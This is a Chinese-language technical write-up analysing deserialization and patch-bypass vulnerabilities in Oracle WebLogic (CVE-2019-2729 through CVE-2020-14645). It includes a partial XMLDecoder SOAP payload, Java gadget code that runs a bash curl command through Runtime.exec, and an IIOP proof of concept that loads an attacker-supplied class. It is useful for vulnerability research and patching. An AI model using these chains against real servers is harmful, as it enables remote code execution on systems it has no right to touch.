## CVE-2019-2729

### 分析

这次是对CVE-2019-2725的绕过，POC如下：

    
    
    <?xml version="1.0" encoding="utf-8"?>  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
    <java>  
    <array method="forName">  
    <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet  
    </string>  
    <void>  
    <array class="byte" length="8970">  
      <void index="0">  
          <byte>-84</byte>  
    ...  
    ...  
    </array>  
    </void>  
    </array>  
    </java>  
    </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>  
    </soapenv:Envelope>

其实就是将被封禁的class标签替换成array标签，同时还带上一个method属性。

由于JDK6和JDK7 XMLDecoder处理方式的差异，这个POC只在JDK6下生效；

JDK7将不同的标签处理交给不同的处理器：

![1686581221_64872fe50062c4d5b1f64.png!small?1686581219140](https://image.3001.net/images/20230612/1686581221_64872fe50062c4d5b1f64.png!small?1686581219140)

而JDK6统一处理不同标签：

    
    
    if (name == "string") {  
    e.setTarget(String.class);  
    e.setMethodName("new");  
    this.isString = true;  
    } else if (this.isPrimitive(name)) {  
    Class wrapper = typeNameToClass(name);  
    e.setTarget(wrapper);  
    e.setMethodName("new");  
    this.parseCharCode(name, attributes);  
    } else if (name == "class") {  
    e.setTarget(Class.class);  
    e.setMethodName("forName");  
    } else if (name == "null") {  
    e.setTarget(Object.class);  
    e.setMethodName("getSuperclass");  
    e.setValue((Object)null);  
    } else if (name == "void") {  
    if (e.getTarget() == null) {  
    e.setTarget(this.eval());  
    }  
    } else if (name == "array") {  
    subtypeName = (String)attributes.get("class");  
    Class subtype = subtypeName == null ? Object.class : this.classForName2(subtypeName);  
    length = (String)attributes.get("length");  
    if (length != null) {  
    e.setTarget(Array.class);  
    e.addArg(subtype);  
    e.addArg(new Integer(length));  
    } else {  
    Class arrayClass = Array.newInstance(subtype, 0).getClass();  
    e.setTarget(arrayClass);  
    }  
    } else if (name == "java") {  
    e.setValue(this.is);  
    } else if (name != "object") {  
    this.simulateException("Unrecognized opening tag: " + name + " " + this.attrsToString(attrs));  
    return;  
    }

JDK7处理array标签的ArrayElementHandler不处理method属性，而JDK6会将method属性的值设置到MutableExpression中：

![1686581231_64872fef3189f5b0550b2.png!small?1686581229437](https://image.3001.net/images/20230612/1686581231_64872fef3189f5b0550b2.png!small?1686581229437)

然后走如下：

    
    
    else if (name == "array") {  
    subtypeName = (String)attributes.get("class");  
    Class subtype = subtypeName == null ? Object.class : this.classForName2(subtypeName);  
    length = (String)attributes.get("length");  
    if (length != null) {  
    e.setTarget(Array.class);  
    e.addArg(subtype);  
    e.addArg(new Integer(length));  
    } else {  
    Class arrayClass = Array.newInstance(subtype, 0).getClass();  
    e.setTarget(arrayClass);  
    }  
    } 

subtype设置成Object.class，同时将MutableExpression的target属性设置成Object[].class。

接着往下：

![1686581240_64872ff8f33d20c14a68d.png!small?1686581239142](https://image.3001.net/images/20230612/1686581240_64872ff8f33d20c14a68d.png!small?1686581239142)

然后将MutableExpression类实例添加到栈中。

接着在ObjectHandler的endElement方法解析结束标签：

![1686581246_64872ffec7739982c8f36.png!small?1686581245002](https://image.3001.net/images/20230612/1686581246_64872ffec7739982c8f36.png!small?1686581245002)

![1686581252_64873004a2f4130f5a195.png!small?1686581250906](https://image.3001.net/images/20230612/1686581252_64873004a2f4130f5a195.png!small?1686581250906)

而它会从栈中取出MutableExpression类实例，然后执行MutableExpression类实例的getValue方法。

![1686581331_648730538699637ee2c46.png!small?1686581329718](https://image.3001.net/images/20230612/1686581331_648730538699637ee2c46.png!small?1686581329718)

在构造函数中，由于value被赋值为unbound，后续从未调用setValue改变过value属性的值，所以在执行getValue时会走if语句，调用invoke方法：

![1686581339_6487305b386d22df6b177.png!small?1686581337518](https://image.3001.net/images/20230612/1686581339_6487305b386d22df6b177.png!small?1686581337518)

invoke方法又执行invokeInternal方法（如下）：

![1686581348_64873064b85f5f455c9f3.png!small?1686581346982](https://image.3001.net/images/20230612/1686581348_64873064b85f5f455c9f3.png!small?1686581346982)

箭头标记程序走的位置，var2为forName，前面三个if不满足，接着往下：

![1686581353_64873069d4264e242b5be.png!small?1686581351961](https://image.3001.net/images/20230612/1686581353_64873069d4264e242b5be.png!small?1686581351961)

这里的两个if都会走，由于找不到Object[].class的forName方法，所以var10为null，进入第二个if语句，尝试查找Class.class的forName方法，查找成功。再往后看：

![1686581359_6487306f052916607966c.png!small?1686581357115](https://image.3001.net/images/20230612/1686581359_6487306f052916607966c.png!small?1686581357115)

执行Class.forName，将oracle.toplink.internal.sessions.UnitOfWorkChangeSet作为参数。将UnitOfWorkChangeSet类加载进内存，在后续标签退出时实例化UnitOfWorkChangeSet类。

## CVE-2019-2827

### 分析

这次是针对CVE-2019-2618文件上传对于目录穿越修复的绕过。

CVE-2019-2618的补丁如下：

![1686581365_648730759b7977bd6c2dc.png!small?1686581363942](https://image.3001.net/images/20230612/1686581365_648730759b7977bd6c2dc.png!small?1686581363942)

检测到目录包含`../`、`/..`、`\..`、`..\`，这种方式并不能完全过滤目录穿越，可以使用只有两个点的`..`进行绕过，就造成了这次CVE。

### 修复

若检测到包含两个点就报异常，完全杜绝了目录穿越。

![1686581371_6487307bd1dfaf0379320.png!small?1686581370291](https://image.3001.net/images/20230612/1686581371_6487307bd1dfaf0379320.png!small?1686581370291)

## CVE-2019-2890

### 分析

T3协议二次反序列化漏洞。

使用黑名单之外的类PersistentContext进行反序列化：

![1686581378_6487308211bfd789794c0.png!small?1686581376614](https://image.3001.net/images/20230612/1686581378_6487308211bfd789794c0.png!small?1686581376614)

蓝色框起来的部分直接使用传递的参数ObjectInputStream进行readObject，会进行黑名单校验，这里虽然有很多readObject，但是无法绕过黑名单。然后调用readSubject方法：

![1686581384_648730888a57c411ae6a4.png!small?1686581382641](https://image.3001.net/images/20230612/1686581384_648730888a57c411ae6a4.png!small?1686581382641)

readSubject方法中直接创建了一个原始的ObjectInputStream，原始的ObjectInputStream未进行任何过滤，在这里直接进行readObject，就绕过了黑名单实现任意类反序列化，配合JDK7u21链打RCE。

## CVE-2020-2551

### 概述

在WebLogic中，T3协议反序列化时会检查类以及父类是否在黑名单，而IIOP协议反序列化时只会检查当前类是否在黑名单，这就造成了绕过。之前的补丁中，由于AbstractPlatformTransactionManager类在黑名单中，而子类JtaTransactionManager不在黑名单中，所以当使用T3协议反序列化JtaTransactionManager类时就会抛出异常。而使用IIOP协议反序列化JtaTransactionManager类时由于不会检查父类就造成了绕过。

### 介绍

OMG（对象管理组织）：一种组织，类似W3C组织。

CORBA（Common Object Request Broker
Architecture，公共对象请求代理体系结构）：为了满足不同应用程序间通信的需求，OMG制定了CORBA，它是一种标准的面向对象应用程序体系规范。

POA（Portable Object
Adapter，便携式对象适配器）：POA拦截客户端的请求，获取需要执行的方法，调用具体实现类的对应方法，写入返回结果。

ORB（Object Request Broker，对象请求代理）：ORB是一个中间件，负责代理客户端和服务端之间的通信。

IOR（Interoperable Object Reference，互操作对象引用）：是CORBA中用于标识对象的唯一标识符。

IDL（Interface Definition
Language，接口定义语言）：IDL是与编程语言无关的一种规范化描述性语言，为了将IDL转换成不同的编程语言，都制定了一套自用的编译器用于将可读取的OMG
IDL文件转换或映射成相应的接口或类型。Java IDL（IDLJ）就是Java实现的这套编译器。

OMG IDL（Object Mangement Group Interface Definition Language，对象管理组标准化接口定义语言）

GIOP（General Inter-ORB
Protocol，通用ORB间协议）：为了满足ORB之间的通信，而定义的数据传输的协议，GIOP针对不同的通信层有不同的具体实现。

IIOP（Internet Inter-ORB Protocol，TCP/IP层ORB间协议）：IIOP是GIOP针对TCP/IP层的具体实现。

DII（Dynamic Invocation
Interface，动态调用接口）：这是CORBA调用的一种方式，既可以用`Stub`方式调用，也可以通过`DII`方式调用。

CORBA体系结构分为三部分：

  * naming service

  * client side

  * servant side

![1686581393_648730918b916d2a1eca3.png!small?1686581391573](https://image.3001.net/images/20230612/1686581393_648730918b916d2a1eca3.png!small?1686581391573)

### 分析

CVE-2018-3191也使用的JtaTransactionManager，这两个CVE的反序列化过程是一样的。

在JtaTransactionManager的readObject方法：

![1686581413_648730a554a8d21059a02.png!small?1686581411391](https://image.3001.net/images/20230612/1686581413_648730a554a8d21059a02.png!small?1686581411391)

进入initUserTransactionAndTransactionManager方法查看：

![1686581452_648730cc5cc5e05e61c78.png!small?1686581450532](https://image.3001.net/images/20230612/1686581452_648730cc5cc5e05e61c78.png!small?1686581450532)

若userTransaction为null，则判断userTransactionName是否有值，有值的话调用lookupUserTransaction方法，同时将userTransactionName传递。

![1686581456_648730d08bb2e0c44e92f.png!small?1686581454693](https://image.3001.net/images/20230612/1686581456_648730d08bb2e0c44e92f.png!small?1686581454693)

发起JNDI连接，使用可控的userTransactionName作为URL。造成JNDI注入。

再看看是怎么到达JtaTransactionManager的readObject方法的：

调用链：

![1686581577_64873149d6cd65c38ddd6.png!small?1686581576020](https://image.3001.net/images/20230612/1686581577_64873149d6cd65c38ddd6.png!small?1686581576020)

从WLSExecuteRequest的run方法开始：

![1686581583_6487314f075dd12f7ca01.png!small?1686581581007](https://image.3001.net/images/20230612/1686581583_6487314f075dd12f7ca01.png!small?1686581581007)

将请求交给CORBA服务器引用处理，handleRequest方法CorbaServerRef未实现，所以交给父类BasicServerRef处理：

![1686581588_64873154037d08996777f.png!small?1686581586452](https://image.3001.net/images/20230612/1686581588_64873154037d08996777f.png!small?1686581586452)

getRuntimeMethodDescriptor方法获取要操作的方式，为bind_any，然后就是获取类加载器，判断操作方式是单向，还是双向（需要服务器响应数据），再预处理请求，获取认证主体。最后调用invoker的invoke方法。invoker为ClusterableServerRef：

![1686581642_6487318a3bfffcdeebe0a.png!small?1686581640631](https://image.3001.net/images/20230612/1686581642_6487318a3bfffcdeebe0a.png!small?1686581640631)

判断是否为IIOP入站请求，是的话处理HTTP附加信息，封装到response中，然后调用CorbaServerRef处理请求：

![1686581676_648731acb6db44deec7b6.png!small?1686581675055](https://image.3001.net/images/20230612/1686581676_648731acb6db44deec7b6.png!small?1686581675055)

判断连接是否在本机中，且客户端是否消亡，然后根据IIOP请求指定的方法（bind_any）从objectMethods中查找，这里查找不到，所以m为null，然后创建响应handler，最后由委托处理该IIOP请求。

![1686633501_6487fc1d132b666c618cd.png!small?1686633501184](https://image.3001.net/images/20230613/1686633501_6487fc1d132b666c618cd.png!small?1686633501184)

这里获取bind_any的处理标志0，不同的操作有不同的标志，比如rebind_any为1、resolve_any为2、resolve_str_any为3、to_string为4、to_name为5、to_url为6、resolve_str为7、bind为8、rebind为9、bind_context为10、rebind_context为11、resolve为12、unbind为13、new_context为14、bind_new_context为15、destroy为16、list为17。这些都是和Corba
Naming service交互的方式。WNameHelper.read(in);从输入流中读取对象唯一标识符：

![1686633511_6487fc272385166a5db41.png!small?1686633511288](https://image.3001.net/images/20230613/1686633511_6487fc272385166a5db41.png!small?1686633511288)

接着调用read_any方法获取对象，然后使用bind_any方法将对象标识和具体对象绑定到Naming service中。

这里先看一下read_any方法：

![1686633516_6487fc2c3c2bad930f304.png!small?1686633516180](https://image.3001.net/images/20230613/1686633516_6487fc2c3c2bad930f304.png!small?1686633516180)

查看重载的read_any方法：

![1686633527_6487fc375e26227602c09.png!small?1686633527397](https://image.3001.net/images/20230613/1686633527_6487fc375e26227602c09.png!small?1686633527397)

查看read_value方法：

![1686633535_6487fc3f1a13e73c8839d.png!small?1686633535078](https://image.3001.net/images/20230613/1686633535_6487fc3f1a13e73c8839d.png!small?1686633535078)

查看read_value_internal方法：

![1686633539_6487fc43d82a611e9a966.png!small?1686633539885](https://image.3001.net/images/20230613/1686633539_6487fc43d82a611e9a966.png!small?1686633539885)

这里根据标志位，读取不同数据类型的数据，我们的标志位为29：

![1686633545_6487fc49e884c128d7ec3.png!small?1686633545923](https://image.3001.net/images/20230613/1686633545_6487fc49e884c128d7ec3.png!small?1686633545923)

29没有break，到30处调用read_value方法：

![1686633550_6487fc4e2b69d091c93dc.png!small?1686633550181](https://image.3001.net/images/20230613/1686633550_6487fc4e2b69d091c93dc.png!small?1686633550181)

接着调用重载的read_value方法，重载的方法特别长，这里分段查看：

![1686633554_6487fc522ebfaf4e78f88.png!small?1686633554241](https://image.3001.net/images/20230613/1686633554_6487fc522ebfaf4e78f88.png!small?1686633554241)

getPossibleCodebase获取codebase，为null，接着往下看：

![1686633558_6487fc56b01b5c78e0310.png!small?1686633558761](https://image.3001.net/images/20230613/1686633558_6487fc56b01b5c78e0310.png!small?1686633558761)

  

进入else分支：

![1686633566_6487fc5e66a6d939fba6e.png!small?1686633566614](https://image.3001.net/images/20230613/1686633566_6487fc5e66a6d939fba6e.png!small?1686633566614)

接着往下：

![1686633576_6487fc689f66321d1ed7e.png!small?1686633576744](https://image.3001.net/images/20230613/1686633576_6487fc689f66321d1ed7e.png!small?1686633576744)

![1686633583_6487fc6fe019b7f6deafc.png!small?1686633583871](https://image.3001.net/images/20230613/1686633583_6487fc6fe019b7f6deafc.png!small?1686633583871)

这里有几个条件满足才能进入该else-if：

  1. c不为null；

  2. JtaTransactionManager的类描述信息ClassInfo中的库id和本地的库id相同；

  3. JtaTransactionManager为Externalizable的子类或ObjectStreamClass支持使用Unsafe反序列化；

在else-if中，获取JtaTransactionManager的ObjectStreamClass实例，然后在allocateValue方法中使用无参构造器进行JtaTransactionManager类的实例化，然后调用ValueHandlerImpl.readValue方法：

![1686633592_6487fc78624d810616e02.png!small?1686633592364](https://image.3001.net/images/20230613/1686633592_6487fc78624d810616e02.png!small?1686633592364)

由于反序列化的类不是数组，且不是Externalizable的，所以进入最后一个else，调用readValueData方法：

![1686633596_6487fc7ce2feb819496b4.png!small?1686633596998](https://image.3001.net/images/20230613/1686633596_6487fc7ce2feb819496b4.png!small?1686633596998)

进入ObjectStreamClass实例的readObject方法：

![1686633628_6487fc9c80b604ab7198b.png!small?1686633628555](https://image.3001.net/images/20230613/1686633628_6487fc9c80b604ab7198b.png!small?1686633628555)

readObjectMethod为JtaTransactionManager的readObject方法，这里反射调用该方法，传入JtaTransactionManager类实例和输入流。

![1686633633_6487fca1172013254d57e.png!small?1686633633111](https://image.3001.net/images/20230613/1686633633_6487fca1172013254d57e.png!small?1686633633111)

至此流程结束，后续就是刚开始的内容了。

### NAT问题

IIOP协议交互过程如下：

  1. op=LocateRequest，向WebLogic请求NameService的地址；

  2. op=LocateReply，WebLogic返回Naming Service的地址（内网IP）；

  3. op=rebind_any，向Naming Service绑定对象（由于不在同一个子网，所以不能直接访问其他子网下的内网IP）；

解决：

  1. 重写IOPProfile的read方法，在read方法里，覆盖新建的ConnectionKey对象；

  2. 在`ContextImpl#bind`方法的调用中，记录下远程ip地址和端口，然后重写IIOPRemoteRef的locateIORForRequest方法，在locateIORForRequest方法里，覆盖传入参数IOR对象的profiles属性；

  3. 抓包，将Naming Service的内网IP改为它所拥有的外网IP。

### 修复

> 图片源自<https://paper.seebug.org/1138/>

判断当前类以及父类是否在黑名单：

![1686633679_6487fccf1fab17de00359.png!small?1686633679177](https://image.3001.net/images/20230613/1686633679_6487fccf1fab17de00359.png!small?1686633679177)

![1686633683_6487fcd3df6cf3c7a81c1.png!small?1686633684081](https://image.3001.net/images/20230613/1686633683_6487fcd3df6cf3c7a81c1.png!small?1686633684081)

## CVE-2020-2555

### 分析

该漏洞产生于可选组件 Oracle
Coherence，不适用于WebLogic10.3.6，因为10.3.6默认不开启Coherence组件。同时如果使用的是JDK8，那么需要小于8u76，因为依赖BadAttributeValueExpException作为反序列化入口点。

调用链如下：

    
    
    BadAttributeValueExpException.readObject()  
    LimitFilter.toString()  
    ChainedExtractor.extract()  
        ReflectionExtractor.extract()  
            Method.invoke()  
                Class.getMethod()  
        ReflectionExtractor.extract()  
            Method.invoke()  
                Runtime.getRuntime()  
        ReflectionExtractor.extract()  
            Method.invoke()  
                Runtime.exec()

这里从BadAttributeValueExpException.readObject()开始：

![1686633691_6487fcdb745c49b438863.png!small?1686633691577](https://image.3001.net/images/20230613/1686633691_6487fcdb745c49b438863.png!small?1686633691577)

读取所有属性，获取属性名为val的值，然后调用toString方法，进入LimitFilter.toString()：

![1686633696_6487fce061d767cdc69a1.png!small?1686633696675](https://image.3001.net/images/20230613/1686633696_6487fce061d767cdc69a1.png!small?1686633696675)

这里封装的m_comparator为ChainedExtractor，它为ValueExtractor接口的实现类，所以进入if循环，调用extract方法，这里extract方法传递的参数为m_oAnchorTop属性，它被赋值为Runtime.class。

![1686633701_6487fce524f23916b34dc.png!small?1686633701082](https://image.3001.net/images/20230613/1686633701_6487fce524f23916b34dc.png!small?1686633701082)

![1686633705_6487fce9353bd903c182d.png!small?1686633705168](https://image.3001.net/images/20230613/1686633705_6487fce9353bd903c182d.png!small?1686633705168)

![1686633709_6487fced81ea3c7fc2039.png!small?1686633709474](https://image.3001.net/images/20230613/1686633709_6487fced81ea3c7fc2039.png!small?1686633709474)

在ChainedExtractor的extractor方法中（如上），获取m_aExtractor属性值，为ValueExtractor数组，然后调用数组里的每个元素的extractor方法，同时传递oTarget参数，在调用完成后将返回值重新赋给oTarget，然后下次循环再将oTarget作为参数。也就是说，调用第一个元素的extract方法后，将返回值作为下一个元素extract方法的参数，这样不断循环。

我们将m_aExtractor属性值设置为ReflectionExtractor数组，

    
    
    ReflectionExtractor extractor1 = new ReflectionExtractor(  
    "getMethod",  
    new Object[]{"getRuntime", new Class[0]}  
    ​  
    );  
    ​  
    // get invoke() to execute exec()  
    ReflectionExtractor extractor2 = new ReflectionExtractor(  
    "invoke",  
    new Object[]{null, new Object[0]}  
    ​  
    );  
    ​  
    // invoke("exec","calc")  
    ReflectionExtractor extractor3 = new ReflectionExtractor(  
    "exec",  
    new Object[]{new String[]{"/bin/bash", "-c", "curl http://127.0.0.1:1234/success"}}  
    );  
    ​  
    ReflectionExtractor[] extractors = {  
    extractor1,  
    extractor2,  
    extractor3,  
    };

这样来到ReflectionExtractor的extract方法：

![1686633720_6487fcf895969a3766286.png!small?1686633720731](https://image.3001.net/images/20230613/1686633720_6487fcf895969a3766286.png!small?1686633720731)

找到getMethod方法，然后调用该方法，参数为getRuntime。相当于如下：

    
    
    Runtime.class.getMethod("getRuntime")

然后返回值为Method（代表getRuntime方法）实例。

第二次循环：

![1686633726_6487fcfee137027439336.png!small?1686633727068](https://image.3001.net/images/20230613/1686633726_6487fcfee137027439336.png!small?1686633727068)

这里相当于：

    
    
    getRuntime()

返回值为Runtime类实例。

第三次循环：

![1686633732_6487fd04c46d6484a3e40.png!small?1686633732786](https://image.3001.net/images/20230613/1686633732_6487fd04c46d6484a3e40.png!small?1686633732786)

反射执行exec方法。

    
    
    exec(new String[]{"/bin/bash", "-c", "curl http://127.0.0.1:1234/success"})

连在一起就是：

    
    
    Runtime.class.getMethod("getRuntime").invoke().exec(new String[]{"/bin/bash", "-c", "curl http://127.0.0.1:1234/success"})

整个流程类似CC5，且ChainedExtractor类和ChainedTransformer类的功能极其相似。

### 修复

CVE-2020-2555的补丁中将LimitFilter类的toString()方法中的extract()方法调用全部移除了：

> 下图来自<https://y4er.com/posts/weblogic-cve-2020-2555/>

![1686633739_6487fd0bd925fd68c5837.png!small?1686633740259](https://image.3001.net/images/20230613/1686633739_6487fd0bd925fd68c5837.png!small?1686633740259)

## CVE-2020-2883

### 分析

该漏洞是对CVE-2020-2555补丁的绕过，CVE-2020-2555补丁将LimitFilter类的toString方法中所有的extract()方法调用删除，但是却可以通过其他路径到达ChainedExtractor的extract方法。

网上公开的两条链：

    
    
    第一条Gadget：  
    ​  
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
    siftDownUsingComparator()  
    com.tangosol.util.comparator.ExtractorComparator.compare()  
    com.tangosol.util.extractor.ChainedExtractor.extract()  
        com.tangosol.util.extractor.ReflectionExtractor().extract()  
            Method.invoke()  
            .......  
        com.tangosol.util.extractor.ReflectionExtractor().extract()  
            Method.invoke()  
            Runtime.exec()  
    第二条Gadget：  
    ​  
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
    siftDownUsingComparator()  
    com.tangosol.util.extractor.AbstractExtractor.compare()  
    com.tangosol.util.extractor.MultiExtractor.extract()  
    com.tangosol.util.extractor.ChainedExtractor.extract()  
        com.tangosol.util.extractor.ChainedExtractor.extract()  
            com.tangosol.util.extractor.ReflectionExtractor().extract()  
                Method.invoke()  
                .......  
            com.tangosol.util.extractor.ReflectionExtractor().extract()  
                Method.invoke()  
                Runtime.exec()

两条链都借助PriorityQueue作为入口点，分别触发ExtractorComparator和AbstractExtractor的compare方法。

我们先看ExtractorComparator，它的compare方法如下：

![1686633747_6487fd13d86576bccc858.png!small?1686633748080](https://image.3001.net/images/20230613/1686633747_6487fd13d86576bccc858.png!small?1686633748080)

这个简单，直接将m_extractor属性的值赋成ChainedExtractor即可。

再看看AbstractExtractor的compare方法：

![1686633752_6487fd1874e589474ffea.png!small?1686633752415](https://image.3001.net/images/20230613/1686633752_6487fd1874e589474ffea.png!small?1686633752415)

调用子类MultiExtractor的extract方法（如下）：

![1686633757_6487fd1d1743f9cd2f233.png!small?1686633757077](https://image.3001.net/images/20230613/1686633757_6487fd1d1743f9cd2f233.png!small?1686633757077)

获取属性m_aExtractor的值，然后循环调用里面每个元素的extract方法。这个只需要给予一个ChainedExtractor实例，也能到达后续的路径。

除了使用ReflectionExtractor执行方法，还可以使用MvelExtractor执行表达式。

MvelExtractor的extract方法如下：

![1686633762_6487fd22b8fc9d436d846.png!small?1686633762762](https://image.3001.net/images/20230613/1686633762_6487fd22b8fc9d436d846.png!small?1686633762762)

获取m_oExpr属性的值，然后调用executeExpression执行表达式。表达式可以是执行命令，写文件等操作，比ReflectionExtractor构造更方便，只需要将触发MvelExtractor的extract方法即可，也不用使用ChainedExtractor包装。

### 修复

CVE-2020-2883的补丁将MvelExtractor和ReflectionExtractor列入黑名单。

## CVE-2020-2963

### 分析

使用SOAPInvokeState类进行反序列化，由于该类不在黑名单，所以不会拦截。

然后进入该类的readExternal方法：

![1686633770_6487fd2a1eba04a57499f.png!small?1686633770224](https://image.3001.net/images/20230613/1686633770_6487fd2a1eba04a57499f.png!small?1686633770224)

定义了一个原始的对象输入流，然后从该输入流中读取对象。原始的ObjectInputStream未作任何过滤，可以反序列化任何类，这就绕过了黑名单的限制。

## CVE-2020-14644

### 分析

该漏洞影响版本为 `12.2.1.3.0、12.2.1.4.0,
14.1.1.0.0`。所以说又要重新搞一个12.2.1.3.0版本的WebLogic了。这里能直接RCE，漏洞的入口点在RemoteConstructor的readResolve方法：

![1686633775_6487fd2fd06930b0bcd70.png!small?1686633775861](https://image.3001.net/images/20230613/1686633775_6487fd2fd06930b0bcd70.png!small?1686633775861)

进入newInstance方法：

![1686633780_6487fd34240ae29b6e2cb.png!small?1686633780053](https://image.3001.net/images/20230613/1686633780_6487fd34240ae29b6e2cb.png!small?1686633780053)

![1686633785_6487fd39045f96ed75eac.png!small?1686633784937](https://image.3001.net/images/20230613/1686633785_6487fd39045f96ed75eac.png!small?1686633784937)

this.getClassLoader获取类加载器，然后调用get方法，get方法体里将获取的类加载器放入s_mapByClassLoader属性中。该属性为Map类型，相当于缓存的作用。

然后调用realize方法，将this指针传入。

![1686633790_6487fd3e32206c8183b0f.png!small?1686633790214](https://image.3001.net/images/20230613/1686633790_6487fd3e32206c8183b0f.png!small?1686633790214)

首先constructor.getDefinition()就是获取RemoteConstructor的m_definition属性（ClassDefinition类实例）：

![1686633794_6487fd42eb560fba825ea.png!small?1686633794906](https://image.3001.net/images/20230613/1686633794_6487fd42eb560fba825ea.png!small?1686633794906)

然后registerIfAbsent方法将RemoteConstructor的m_definition属性（ClassDefinition类实例）放入RemotableSupport的缓存f_mapDefinitions属性中，并将ClassDefinition返回：

![1686633798_6487fd46c90d454c1fc73.png!small?1686633798795](https://image.3001.net/images/20230613/1686633798_6487fd46c90d454c1fc73.png!small?1686633798795)

然后调用definition.getRemotableClass();（如下）方法获取ClassDefinition的m_clz属性：

![1686633802_6487fd4ac178a9bd1d2bd.png!small?1686633802725](https://image.3001.net/images/20230613/1686633802_6487fd4ac178a9bd1d2bd.png!small?1686633802725)

![1686633807_6487fd4f1a170b3c8547a.png!small?1686633807042](https://image.3001.net/images/20230613/1686633807_6487fd4f1a170b3c8547a.png!small?1686633807042)

进入if语句后再调用一次definition.getRemotableClass();（如下）获取到的仍为null，此时再进入第二层if，调用defineClass方法：

![1686633811_6487fd5356b83893e6665.png!small?1686633811308](https://image.3001.net/images/20230613/1686633811_6487fd5356b83893e6665.png!small?1686633811308)

![1686633815_6487fd575d106b70a7c67.png!small?1686633815520](https://image.3001.net/images/20230613/1686633815_6487fd575d106b70a7c67.png!small?1686633815520)

![1686633819_6487fd5b8723a96ca0870.png!small?1686633819460](https://image.3001.net/images/20230613/1686633819_6487fd5b8723a96ca0870.png!small?1686633819460)

![1686633824_6487fd601e8291aed56fd.png!small?1686633824209](https://image.3001.net/images/20230613/1686633824_6487fd601e8291aed56fd.png!small?1686633824209)

获取definition的全类名，将/替换成.，然后获取definition的m_abClass属性的值，它是字节数组，最后调用defineClass方法。

由于RemotableSupport继承ClassLoader，且没有重写带有四个参数的defineClass方法，所以由父类ClassLoader的defineClass方法来将字节数组转成Class类，并返回。

![1686633829_6487fd65e092e2ec16a7a.png!small?1686633830046](https://image.3001.net/images/20230613/1686633829_6487fd65e092e2ec16a7a.png!small?1686633830046)

然后调用setRemotableClass方法：

![1686633834_6487fd6abbca072d22ad2.png!small?1686633834903](https://image.3001.net/images/20230613/1686633834_6487fd6abbca072d22ad2.png!small?1686633834903)

该方法将参数Class赋值给definition的m_clz属性，且该Class只有一个构造器，找到这个构造器然后赋值给definition的m_mhCtor属性。

然后是realize方法的下半部分：

![1686633839_6487fd6f20215c9337493.png!small?1686633839168](https://image.3001.net/images/20230613/1686633839_6487fd6f20215c9337493.png!small?1686633839168)

调用ClassDefinition的createInstance方法：

![1686633843_6487fd73ece6e4f28aab7.png!small?1686633843905](https://image.3001.net/images/20230613/1686633843_6487fd73ece6e4f28aab7.png!small?1686633843905)

获取无参构造函数并执行。

所以重点在ClassDefinition类中。

我们只需要自定义ClassDefinition类，然后设置它的属性m_abClass为恶意类的字节数组，同时保证该恶意类只有一个构造函数，那么我们就可以在该构造函数中执行一些恶意操作。后面当实例化该恶意类时，就会触发恶意操作了。

同时还有一个细节在RemotableSupport的defineClass方法中（如下），就是要确保字节数组abClass中包含的类名和sClassName相同，不然会抛NoClassDefFoundError错误。

![1686633849_6487fd79f337380facda2.png!small?1686633850001](https://image.3001.net/images/20230613/1686633849_6487fd79f337380facda2.png!small?1686633850001)

这里sClassName为：包名+类名+$+version。例如：org.EvilObj$67390FCFBBD7BF8BFE3CDBB40211C00B。

sClassName通过如下两个操作获得：

![1686633854_6487fd7e75c3eff6d3365.png!small?1686633854656](https://image.3001.net/images/20230613/1686633854_6487fd7e75c3eff6d3365.png!small?1686633854656)

![1686633857_6487fd81ecf03d34336b8.png!small?1686633857937](https://image.3001.net/images/20230613/1686633857_6487fd81ecf03d34336b8.png!small?1686633857937)

getId返回的是m_id属性，也就是ClassIdentity类实例，然后调用该类实例的getName方法：

![1686633863_6487fd87f069e0de95fc2.png!small?1686633863977](https://image.3001.net/images/20230613/1686633863_6487fd87f069e0de95fc2.png!small?1686633863977)

![1686633868_6487fd8c49345e1389424.png!small?1686633868221](https://image.3001.net/images/20230613/1686633868_6487fd8c49345e1389424.png!small?1686633868221)

getPackage是获取包名，getSimpleName等于类名+$+m_sVersion属性。

所以getName返回包名+类名+$+m_sVersion属性。

这个m_sVersion属性表示类文件的内容 `MD5`值，例如：

    
    
    ClassIdentity classIdentity = new ClassIdentity(EvilObj.class);

classIdentity的m_sVersion属性值是自动生成的，为EvilObj.class文件的内容MD5值。

回到这里：

![1686633873_6487fd91cc723cfbce48c.png!small?1686633873960](https://image.3001.net/images/20230613/1686633873_6487fd91cc723cfbce48c.png!small?1686633873960)

可以使用javassist或者ASM等字节码修改工具，将abClass字节数组里的类名改成包名+类名+$+m_sVersion属性这种类型。

最后的POC如下（来自[Sp4rr0vv](https://www.anquanke.com/post/id/213074#h2-0)）：

    
    
    ClassIdentity classIdentity = new ClassIdentity( EvilObj.class);  
    ClassPool cp = ClassPool.getDefault();  
    CtClass ctClass = cp.get(EvilObj.class.getName());  
    ctClass.replaceClassName(EvilObj.class.getName(),  EvilObj.class.getName() + "$" + classIdentity.getVersion());  
    RemoteConstructor constructor = new RemoteConstructor(  
    new ClassDefinition(classIdentity, ctClass.toBytecode()),  
    new Object[] {}  
    );  
    // 发送 IIOP 协议数据包  
    Context context = getContext("iiop://ip:port");  
    context.rebind("hello",constructor);

整个流程为：

获取RemoteConstructor的m_definition属性（ClassDefinition），再获取ClassDefinition的m_abClass字节数组，转换成类，找到类中的构造函数，再赋值给ClassDefinition的m_mhCtor属性，最后获取该属性，执行该构造函数，触发恶意操作。

## CVE-2020-14645

### 分析

这个与CVE-2020-2883相似，调用链如下：

    
    
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
    siftDownUsingComparator()  
    ExtractorComparator.compare()  
    UniversalExtractor.extract()   
    UniversalExtractor.extractComplex()   
    Method.invoke()  
    JdbcRowSetImpl.getDatabaseMetaData()

在CVE-2020-2883，是通过ExtractorComparator的compare方法触发ChainedExtractor的extract方法。

而CVE-2020-14645通过ExtractorComparator的compare方法触发UniversalExtractor的extract方法，UniversalExtractor是一个全新的类，之前从未使用过，它是
Weblogic 12.2.1.4.0 Coherence 组件特有的类，只适用于12.2.1.4.0版本的WebLogic。

